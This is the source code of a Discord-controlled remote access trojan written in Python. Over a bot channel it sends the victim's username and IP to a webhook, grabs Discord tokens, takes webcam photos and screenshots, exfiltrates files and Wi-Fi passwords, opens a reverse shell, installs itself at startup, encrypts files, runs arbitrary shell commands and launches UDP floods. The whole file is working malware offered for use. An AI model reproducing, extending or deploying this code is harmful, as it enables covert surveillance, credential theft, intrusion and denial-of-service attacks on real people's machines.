from trojan_functions import cam, rv, token_grabber, screen_shot, encrypt_decrypt, check_requirements
import os, subprocess, getpass, datetime, platform, shutil, socket, time, random, webbrowser, signal, sys
try:
    import requests
    from discord_webhook import DiscordWebhook
    import cv2
    import discord
    from discord.ext import commands
    import pytube
    import pyautogui
except ModuleNotFoundError:
    check_requirements.check()
    sys.exit()

#url

public_ip = "https://checkip.amazonaws.com"
Webhook_url = "webhook url"
discord_bot_token = 'discord bot token'

#end url

webhook = DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get(public_ip).text + "si è connsesso"))
response = webhook.execute()

client = commands.Bot(command_prefix='?', description="", intents=discord.Intents.all())

@client.event
async def on_ready():
    print("the trojan is ready")

@client.command()
@commands.has_permissions(administrator=True)
async def ip(ctx):
    await ctx.send(requests.get(public_ip).text)

@client.command()
@commands.has_permissions(administrator=True)
async def whoami(ctx):
    await ctx.send(getpass.getuser() + " -> " + requests.get(public_ip).text)

@client.command()
async def info(ctx):
    try:
        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get(public_ip).text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\nDiscord Token: " + token_grabber.tok_grab() +"\n--------------------")
    except:
        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get(public_ip).text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())))

@client.command()
@commands.has_permissions(administrator=True)
async def cam_snap(ctx):
    try:
        cam.cam_snap()
        await ctx.send(datetime.datetime.now())
        await ctx.send(file=discord.File('photo.png'))
        os.remove("photo.png")
    except:
        await ctx.send("Error. camera not found")

@client.command()
@commands.has_permissions(administrator=True)
async def upload_file(ctx, url, output_name):
    await ctx.send("Downloading the file...")
    try:
        resp = requests.get(url)
        open(output_name, "wb").write(resp.content)
        await ctx. send("File uploaded")
    except:
        await ctx.send("Error. File not uploaded")

@client.command()
@commands.has_permissions(administrator=True)
async def download_file(ctx, filename):
    try:
        await ctx.send(datetime.datetime.now())
        await ctx.send(file=discord.File(filename))
    except:
        await ctx.send("Error. File not found")

@client.command()
@commands.has_permissions(administrator=True)
async def write_file(ctx, inp):
    try:
        open("file.txt", "w").write(inp)
        os.startfile("file.txt")
        await ctx.send("file written and opened")
    except:
        await ctx.send("Error.")

@client.command()
@commands.has_permissions(administrator=True)
async def pwd(ctx):
    await ctx.send(os.getcwd())

@client.command()
@commands.has_permissions(administrator=True)
async def ls(ctx, dirr):
    sdir = os.listdir(dirr)
    fdir = ""
    for i in range(len(sdir)):
        if(os.path.isdir(dirr + "/" + sdir[i]) == True):
            fdir += "D " + sdir[i]
            fdir += "\n"
        else:
            fdir += "F " + sdir[i]
            fdir += "\n"
    await ctx.send(fdir)

@client.command()
@commands.has_permissions(administrator=True)
async def rm(ctx, filee):
    try:
        os.remove(filee)
        await ctx.send(filee + " eliminated")
    except:
        await ctx.send("Error, file not found or not eliminated")

@client.command()
@commands.has_permissions(administrator=True)
async def start_process(ctx, process_name):
    try:
        if(platform.system() == "Windows"):
            os.system("start " + process_name)
        else:
            os.system(process_name)
        await ctx.send(datetime.datetime.nowi())
        await ctx.send("Process started")
    except:
        await ctx.send("Failed starting process")

@client.command()
@commands.has_permissions(administrator=True)
async def kill(ctx, process_name):
    if(platform.system() == "Windows"):
        status = os.system("taskkill /IM " + process_name + " /T /F")
        await ctx.send("process killed")
    else:
        status = os.kill(process_name, signal.SIGTERM)
        await ctx.send("process killed")

@client.command()
@commands.has_permissions(administrator=True)
async def encrypt_file(ctx, filename):
    test = encrypt_decrypt.encrypt_file(filename)
    if(test == 1):
        await ctx.send("Error. ")
    else:
        await ctx.send("File encrypted, remember the key -> " + str(test))

@client.command()
@commands.has_permissions(administrator=True)
async def decrypt_file(ctx, filename, key):
    test = encrypt_decrypt.decrypt_file(filename, key)
    if(test == 1):
        await ctx.send("Error. ")
    elif (test == 0):
        await ctx.send("File Decrypted")

@client.command()
@commands.has_permissions(administrator=True)
async def tasklist(ctx):
    if(platform.system() == "Windows"):
        os.system("tasklist > tasks.txt")
    else:
        os.system("ps aux > tasks.txt")
    await ctx.send(file=discord.File("tasks.txt"))
    os.remove("tasks.txt")

@client.command()
async def searchTask(ctx, task):
    try:
        if os.name == "nt":
            task = subprocess.check_output(f"tasklist | findstr {task}", shell=True).decode('utf-8')
        else:
            task = subprocess.check_output(f"ps aux | grep {task}", shell=True).decode('utf-8')
        await ctx.send(task)
    except:
        await ctx.send("Error")

@client.command()
@commands.has_permissions(administrator=True)
async def rmDir(ctx, dirr):
    try:
        os.rmdir(dirr)
        await ctx.send(dirr + " eliminated")
    except:
        await ctx.send("Error, directory not found or not eliminated")

@client.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, amount=1000000000):
    await ctx.channel.purge(limit=amount)

@client.command()
@commands.has_permissions(administrator=True)
async def shutdown(ctx):
    await ctx.send("powering off the pc")
    if(platform.system() == "Windows"):
        os.system("shutdown /s /t 00")
    else:
        os.system("shutdown -r now")

@client.command()
@commands.has_permissions(administrator=True)
async def disconnect(ctx):
    DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get(public_ip).text + "si è disconnsesso")).execute()
    exit()

@client.command()
@commands.has_permissions(administrator=True)
async def wifi_profiles(ctx):
    if(platform.system() == "Windows"):
        l = os.system("netsh wlan show profiles > wifi_profiles.txt")
        if(l == 0):
            await ctx.send(file=discord.File('wifi_profiles.txt'))
            os.remove("wifi_profile.txt")
        else:
            await ctx.send("Error. wifi profile not found")
    else:
        files = os.listdir("/etc/NetworkManager/system-connections/")
        out = ""
        for i in range(len(files)):
            out += files[i] + "\n"
        await ctx.send(out)

@client.command()
@commands.has_permissions(administrator=True)
async def wifi_info(ctx, wifi_name):
    if(platform.system() == "Windows"):
        os.system("netsh wlan show profiles " + wifi_name + " key=clear > wifi_info.txt")
        await ctx.send(file=discord.File('wifi_info.txt'))
        os.remove("wifi_info.txt")
    else:
        l = os.system("cat '/etc/NetworkManager/system-connections/" + wifi_name + "' > wifi_info.txt")
        if(l != 0):
            await ctx.send("Error. Permission denied")
        else:
            await ctx.send(file=discord.File('wifi_info.txt'))
            os.remove("wifi_info.txt")

@client.command()
@commands.has_permissions(administrator=True)
async def system_info(ctx):
    systemInfo = "Platform: " + platform.system()
    if(os.name == "nt"):
        pass
    else:
        systemInfo += "Kernel name: " + subprocess.check_output("uname -s", shell=True).decode('utf-8')
        systemInfo += "Node name: " + subprocess.check_output("uname -n", shell=True).decode('utf-8')
        systemInfo += "Kernel release: " + subprocess.check_output("uname -r", shell=True).decode('utf-8')
        systemInfo += "kernel version: " + subprocess.check_output("uname -v", shell=True).decode('utf-8')
        systemInfo += "Machine: " + subprocess.check_output("uname -m", shell=True).decode('utf-8')
        systemInfo += "Processor: " + subprocess.check_output("uname -p", shell=True).decode('utf-8')
        systemInfo += "Hardware platform: " + subprocess.check_output("uname -i", shell=True).decode('utf-8')
        systemInfo += "OS: " + subprocess.check_output("uname -o", shell=True).decode('utf-8')
    await ctx.send(systemInfo)

@client.command()
@commands.has_permissions(administrator=True)
async def revshell(ctx, ip, port):
    await ctx.send("sending reverse shell")
    try:
        await ctx.send("reverse shell sent :)")
        rv.reverse_shell(ip=ip, port=port)
    except:
        await ctx.send("reverse shell not sent :(")
    await ctx.send("reverse shell closed")

@client.command()
@commands.has_permissions(administrator=True)
async def auto_startup(ctx, filename):
    if(platform.system() == "Windows"):
        try:
            shutil.copy(filename, "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            lunghezza = (len(filename)-1)
            Lettera = filename[lunghezza-1] + filename[lunghezza]
            if(Lettera == "py"):
                try:
                    os.mkdir("C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
                    shutil.copy("trojan_functions\\cam.py", "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
                    shutil.copy("trojan_functions\\rv.py", "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
                except OSError:
                    await ctx.send("auto startup failed")
                await ctx.send("auto startup done")
            else:
                await ctx.send("auto startup done")
        except:
            await ctx.send("auto startup failed")
    else:
        await ctx.send("not compatible on linux")

@client.command()
@commands.has_permissions(administrator=True)
async def token(ctx):
    try:
        await ctx.send(token_grabber.tok_grab())
    except:
        await ctx.send("Error: can't grab the token")

@client.command()
@commands.has_permissions(administrator=True)
async def browser(ctx, url):
    await ctx.send("Opening browser")
    try:
        webbrowser.open(url)
        await ctx.send("Browser opened successfully")
    except:
        await ctx.send("Browser not opened")

@client.command()
@commands.has_permissions(administrator=True)
async def rickroll(ctx):
    try:
        os.startfile("video.mp4")
        await ctx.send("Rickrolled ;)")
    except:
        try:
            yt = pytube.YouTube("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            yt.streams.get_highest_resolution().download()
            title = yt.title + ".mp4"
            os.rename(title,"video.mp4")
            if os.name == "nt":
                os.startfile("video.mp4")
            else:
                subprocess.call(["xdg-open", "video.mp4"])
            await ctx.send("Rickrolled ;)")
        except:
            try:
                webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
                await ctx.send("Rickrolled ;)")
            except:
                await ctx.send("Rickrolled failed :(")

@client.command()
@commands.has_permissions(administrator=True)
async def play_video(ctx, link):
    try:
        os.remove("video2.mp4")
    except:
        pass
    if "://youtube.com" in link:
        yt = pytube.YouTube(link)
        yt.streams.get_highest_resolution().download()
        title = yt.title + ".mp4"
        valid = 1
    elif "://" in link:
        title = "video2.mp4"
        os.system("wget " + link + " -O video2.mp4")
        valid == 1
    else:                                                                                                                                                                                                       
        await ctx.send("Error, invalid url")                                                                                                                                                                    
        valid = 0
    if valid == 1:
        try:
            if title != "video2.mp4":
                os.rename(title,"video2.mp4")
            os.startfile("video2.mp4")
            await ctx.send("Video started")
        except:
            try:
                if(link.startswith("https://www.youtube.com") or link.startswith("https://youtube.com/")):
                    webbrowser.open(link)
                else:
                    await ctx.send("Error, can't open the link")
            except:
                await ctx.send("Error...")

@client.command()
@commands.has_permissions(administrator=True)
async def screenshot(ctx):
    screen_shot.screen_shot()
    await ctx.send(datetime.datetime.now())
    await ctx.send(file=discord.File('photo.png'))
    os.remove("photo.png")

@client.command()
@commands.has_permissions(administrator=True)
async def ddos(ctx, ip, port, tm, dl):
    await ctx.send("Seding sockets")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    start = int(time.time())
    end = int(time.time())
    start_warn = int(time.time())
    end_warn = int(time.time())
    calc_warn = end_warn-start_warn
    calcolo=end-start
    tt = int(tm)
    dl = int(dl)
    port = int(port)
    ss = int(0)
    while(calcolo!=tt):
        try:
            sock.sendto(bytes, (ip,port))
            end = int(time.time())
            calcolo=end-start
            ss += 1
            if(calc_warn == dl):
                await ctx.send("%s socket sent in %s seconds to %s:%s"%(ss, calcolo, ip, port))
                start_warn = int(time.time())
                end_warn = int(time.time())
            end_warn = int(time.time())
            calc_warn = end_warn-start_warn
            if(calcolo == tt):
                await ctx.send("sockets sent successfully")
        except:
            await ctx.send("Error. Host not found")
            break;

@client.command()
async def shell(ctx, command):
    cmd = subprocess.check_output(command, shell=True).decode('utf-8')
    try:
        await ctx.send(cmd)
    except:
        try:
            file = open("tmp.txt", "w")
            file.write(cmd)
            await ctx.send(file=discord.File('tmp.txt'))
            os.remove("tmp.txt")
        except:
            await ctx.send("Error")

@client.command()
async def commands(ctx):
    try:
        await ctx.send(file=discord.File("commands.txt"))
    except:
        await ctx.send("Error, commands.txt not found")


client.run(discord_bot_token)

DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get(public_ip).text + "si è disconnsesso")).execute()

os.system("cls||clear")
